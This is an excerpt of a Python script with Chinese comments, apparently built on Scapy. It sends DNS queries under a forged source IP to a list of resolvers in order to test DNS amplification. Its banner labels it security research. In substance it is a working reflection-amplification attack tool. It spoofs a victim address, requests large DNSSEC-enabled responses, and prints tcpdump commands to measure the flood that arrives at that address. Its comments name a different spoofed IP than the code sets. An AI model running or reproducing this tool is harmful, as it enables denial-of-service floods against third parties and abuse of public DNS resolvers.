...
TIMEOUT = 2
INPUT_FILE = "niceip.txt"
SPOOF_SRC_IP = "8.148.204.169"  # 您的测试服务器IP
...
def build_dns_packet(query_name, query_type_val, dnssec=False, src_port=12345, dst_ip="8.8.8.8"):
    ...
    dns_layer = DNS(
        ...
        ar=DNSRROPT(rclass=4096, z=flags) if dnssec else None
    )
    udp_layer = UDP(sport=src_port, dport=53)
    
    # 使用伪造的源IP地址
    ip_layer = IP(src=SPOOF_SRC_IP, dst=dst_ip, ttl=64)
        
    return ip_layer / udp_layer / dns_layer

# === 测试单个 DNS 服务器（支持伪造源IP） ===
def test_dns_server(server_ip, query_type_val, query_name, use_dnssec, src_port, query_method):
    ...
    try:
        ...
        # 发送伪造源IP的数据包
        # 注意：由于源IP是伪造的，我们无法直接接收响应
        # 响应将被发送到伪造的IP地址（154.23.243.197）
        send(pkt, verbose=0)
        end = time.time()
        
        # 由于我们无法直接接收响应，这里返回理论值
        # 实际测试中，您需要在154.23.243.197服务器上监控接收到的流量
        return {
            "IP": server_ip,
            "Query Method": query_method,
            "Responded": "Sent (check server)",
            "Request Bytes": req_size,
            "Response Bytes": "N/A",
            "Amplification Factor": "N/A",
...
# === 主程序 ===
def main():
    print(f"🚨 网络安全研究测试 - 伪造源IP DNS放大攻击测试")
    print(f"🔧 伪造源IP: {SPOOF_SRC_IP}")
    print(f"💡 注意: 响应将发送到伪造的IP地址，您需要在 {SPOOF_SRC_IP} 上监控接收的流量")
    ...
    try:
        ...
        print(f"📡 在 {SPOOF_SRC_IP} 上监控命令: sudo tcpdump -i any udp and dst port {src_port} -nn -v")
        print(f"📊 统计命令: sudo tcpdump -i any udp and dst port {src_port} -nn -c 1000 | awk '{{print length}}' | awk '{{sum+=$1}} END {{print \"总字节:\", sum, \"平均:\", sum/NR}}'")
